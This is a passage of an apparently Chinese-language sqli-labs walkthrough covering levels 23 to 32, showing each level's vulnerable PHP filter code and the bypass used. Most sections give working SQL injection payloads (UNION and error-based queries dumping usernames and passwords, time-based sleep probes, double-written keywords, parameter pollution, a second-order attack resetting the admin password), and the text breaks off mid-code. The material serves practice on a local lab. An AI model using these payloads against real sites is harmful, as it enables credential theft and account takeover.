class="line"></span><br><span class="line">$id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line">$reg = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line">$reg1 = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line">$replace = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>正如源码所示，将 # 和 – 替换为空，所以可以采用闭合的方式进行注入。</p><hr><h2 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h2><p>关键词：经典二次注入、存储注入</p><p>二次注入通常在注册的位置，插入数据的时候不会产生错误信息，但是在执行其他语句的时候发生了错误。<br>（第一次是向数据库插入Payload，第二次是利用Payload）</p><p>Update语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当用户名为 admin’# 时，sql 语句会变成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;# and password&#x3D;&#39;$curr_pass&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样就会修改 admin 的密码，而不是我自己注册的账号。</p><p>通过这个页面 <a href="http://localhost:4000/Less-24">http://localhost:4000/Less-24</a> 进入注册页面失败，发现是文件路径未找到。在后面填加 index 之后就正常执行了，即访问：<a href="http://localhost:4000/Less-24/index.php%E3%80%82">http://localhost:4000/Less-24/index.php。</a></p><p>注册新用户<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/5B29A116-C50E-4DB1-A821-6345CC7FB629.png"><br>在修改页面进行密码修改，即可修改 admin 的密码。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/8EBA386F-FB14-45C1-AE56-1D196A017E6B.png"></p><hr><h2 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>关键词：GET 类型、过滤 and+or。</p><p>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id= blacklist($id);</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的 or 和 and 只被替换了一次，所以可以采用双写绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 联合注入 Payload</span><br><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,passwoorrd+SEPARATOORR+0x3c62723e)+FROM+users)--+</span><br><span class="line"># 其中 password 改为 passwoord，separator 改为 separatoorr（设置分隔符），0x3c62723e 是十六进制的&lt;br&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>and 可以使用 &amp;&amp; 替换，or 使用 || 替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 报错注入Payload</span><br><span class="line">?id&#x3D;1&#39;||extractvalue(1,concat(0x7e,database()))--+</span><br><span class="line">?id&#x3D;1&#39;||extractvalue(1,concat(0x7e,(SELECT+GROUP_CONCAT(username,passwoorrd+SEPARATOORR+0x3c62723e)+FROM+users)))--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>关键词：报错注入、过滤空格和注释符、过滤 and 和 or、单引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 过滤了 or 和 and 大小写</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;or&#x2F;i&#39;,&quot;&quot;, $id);            &#x2F;&#x2F;strip out OR (non case sensitive)</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;and&#x2F;i&#39;,&quot;&quot;, $id);        &#x2F;&#x2F;Strip out AND (non case sensitive)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 过滤了 &#x2F;*</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[\&#x2F;\*]&#x2F;&#39;,&quot;&quot;, $id);        &#x2F;&#x2F;strip out &#x2F;*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 过滤了 -- 和 # 注释</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[--]&#x2F;&#39;,&quot;&quot;, $id);        &#x2F;&#x2F;Strip out --</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[#]&#x2F;&#39;,&quot;&quot;, $id);            &#x2F;&#x2F;Strip out #</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 过滤了空格</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[\s]&#x2F;&#39;,&quot;&quot;, $id);        &#x2F;&#x2F;Strip out spaces</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 过滤了斜线</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[\&#x2F;\\\\]&#x2F;&#39;,&quot;&quot;, $id);        &#x2F;&#x2F;Strip out slashes</span><br><span class="line">return $id;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>过滤 or 和 and：可以用 &amp;&amp; 和 || 替换或者采用双写的方式绕过</li><li>过滤空格：可以用下表的字符进行替换<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">%09 TAB 键(水平) </span><br><span class="line">%0a 新建一行 </span><br><span class="line">%0c 新的一页 </span><br><span class="line">%0d return 功能 </span><br><span class="line">%0b TAB 键(垂直) </span><br><span class="line">%a0 空格 </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>过滤注释：可以用两侧闭合方式绕过。例如：less-23<br>可以构建 Payload 得：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试是否可以执行</span><br><span class="line">?id&#x3D;1&#39;%26%26sleep(3)%26%26&#39;1</span><br><span class="line"># 其中%26是&amp;，使用两侧闭合方式绕过注释</span><br><span class="line"></span><br><span class="line"># 报错注入Payload</span><br><span class="line">?id&#x3D;1&#39;%26%26extractvalue(1,concat(0x7e,database()))%26%26&#39;1</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p><p>关键词：盲注、布尔注入、延时注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1</span><br><span class="line">?id&#x3D;1&#39;%26%26&#39;1</span><br><span class="line"># 返回结果相同，成功闭合SQL语句</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p><p>关键词：基于错误、过滤 Union 和 Select</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试能否闭合</span><br><span class="line">?id&#x3D;1&#39;%26%26&#39;1</span><br><span class="line">?id&#x3D;1&#39;%26%26sleep(3)%26%26&#39;1</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>过滤 Union 和 select：采用双写绕过（原理同 or 和 and）、采用大小写混合绕过（MySQL对大小写并不敏感）<br>关键代码：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 过滤了 /*</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line"><span class="comment"># 过滤了 -</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line"><span class="comment"># 过滤了 #</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line"><span class="comment"># 过滤了空格</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line"><span class="comment"># 过滤了 select /m 严格模式 不可以使用双写绕过</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤了 union UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line"></span><br></pre></td></tr></table></figure>进行报错注入（类似 less-26）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 报错注入 Payload</span><br><span class="line">?id&#x3D;1&#39;%26%26extractvalue(1, concat(0x7e, database()))%26%26&#39;1</span><br><span class="line">?id&#x3D;1&#39;%26%26extractvalue(1, concat(0x7e, seleselectct database()))%26%26&#39;1</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h2><p>闭合方式：<code>id=&quot;$id&quot;</code></p><p>同 less-27，闭合方式不同。没有输出报错信息，所以不能报错注入。关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$id = <span class="string">&#x27;&quot;&#x27;</span> .$id. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试闭合情况</span><br><span class="line">?id&#x3D;1%26%261</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&quot;%26%26sleep(3)%26%26&quot;1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code> </p><p>关键词：基于错误、过滤 Union 和 Select、单引号+括号<br>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 过滤 /*</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤 - # 注释</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤 空格 +</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤 union select /i 大小写都过滤</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>过滤 union select /i 大小写都过滤：只能采用双写的方式进行注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试SQL语句是否执行</span><br><span class="line"> ?id&#x3D;1&#39;)%26%26sleep(3)%26%26(&#39;1</span><br><span class="line"></span><br><span class="line"># 延时注入Payload</span><br><span class="line">?id&#x3D;1&#39;)%26%26if(database()&#x3D;&#39;security&#39;, sleep(3), 1)%26%26(&#39;1</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p><p>关键代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;$id&#x3D; preg_replace(&#39;&#x2F;[\&#x2F;\*]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;strip out &#x2F;*</span><br><span class="line">&#x2F;&#x2F;$id&#x3D; preg_replace(&#39;&#x2F;[--]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out --.</span><br><span class="line">&#x2F;&#x2F;$id&#x3D; preg_replace(&#39;&#x2F;[#]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out #.</span><br><span class="line">&#x2F;&#x2F;$id&#x3D; preg_replace(&#39;&#x2F;[ +]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out spaces.</span><br><span class="line">&#x2F;&#x2F;$id&#x3D; preg_replace(&#39;&#x2F;select&#x2F;m&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out spaces.</span><br><span class="line">&#x2F;&#x2F;$id&#x3D; preg_replace(&#39;&#x2F;[ +]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out spaces.</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;union\s+select&#x2F;i&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out spaces.</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试 Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 闭合 SQL</span><br><span class="line">?id&#x3D;1&#39;)--+</span><br><span class="line"></span><br><span class="line"># 联合注入 Payload（国光大佬的 payload 测试失败）</span><br><span class="line">?id&#x3D;0&#39;) union&#x2F;**&#x2F;select 1, 2, 3--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>关键词：GET、基于错误、WAF</p><p>index.php 关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> 有结果：</span><br><span class="line">    输出</span><br><span class="line"><span class="keyword">else</span>：</span><br><span class="line">    输出报错信息</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一题太简单了吧，联合注入 Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;0&#39; union select 1, 2, 3--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>login.php 关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 获取查询的字符串</span></span><br><span class="line">$qs = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟Tomcat进行中间过滤</span></span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">$id=$_GET[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 白名单</span></span><br><span class="line">whitelist($id1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// SQL语句</span></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// WAF</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params">$input</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检测数字 以数字开头，以数字结尾</span></span><br><span class="line">    $match = preg_match(<span class="string">&quot;/^\d+$/&quot;</span>, $input);</span><br><span class="line">    <span class="keyword">if</span>($match)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">        <span class="comment">//return $match;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;    </span><br><span class="line">        header(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">        <span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 限制id的长度</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params">$query_string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $q_s = $query_string;</span><br><span class="line">    $qs_array= explode(<span class="string">&quot;&amp;&quot;</span>,$q_s);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>($qs_array <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $val=substr($value,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>($val==<span class="string">&quot;id&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $id_value=substr($value,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">            <span class="keyword">return</span> $id_value;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同时传入两个 id，当前一个 id 被 java_implimentation 捕获的时候（模拟 Tomcat 的解析），第一个 id 就会进入 WAF，如果检测合格则将 GET 参数中的 id 插入 SQL 语句（第二个 id，而不是进入 WAF的 id）。最后的 payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&amp;id&#x3D;-2&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Apache PHP 会解析最后一个参数</li><li>Tomcat JSP 会解析第一个参数</li></ul><hr><h2 id="less-30-1"><a href="#less-30-1" class="headerlink" title="less-30"></a>less-30</h2><p>闭合方式：<code>id=&quot;$id&quot;</code></p><p>同第29题，仅闭合方式不同。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 简单测试一下</span><br><span class="line">?id&#x3D;1&amp;id&#x3D;2&quot; and sleep(3) --+</span><br><span class="line"></span><br><span class="line"># 联合注入</span><br><span class="line">?id&#x3D;1&amp;id&#x3D;0&quot; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h2><p>闭合方式：<code>id=（&quot;$id&quot;）</code></p><p>同29题，仅拼接方式不同。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># unino注入</span><br><span class="line">?id&#x3D;1&amp;id&#x3D;0&quot;) union select 1, 2, 3--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h2><p>闭合方式：<code>id=&quot;$id&quot;</code></p><p>关键词：GET、联合注入、报错注入、布尔盲注、延时注入、绕过addslashes</p><p>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">$id=check_addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在&#x27; &quot; \ 等敏感字符前面添加反斜杠</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;    <span class="comment"># \ 转换为 \\</span></span><br><span class="line">    $string = preg_replace(<span class="string">&#x27;/&#x27;</span>. preg_quote(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, $string); </span><br><span class="line">     <span class="comment"># 将 &#x27; 转为\&quot;</span></span><br><span class="line">    $string = preg_replace(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, $string);   </span><br><span class="line">     <span class="comment"># 将 &quot; 转为\&quot;</span></span><br><span class="line">    $string = preg_replace(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, $string);                                </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_query($con1, <span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span 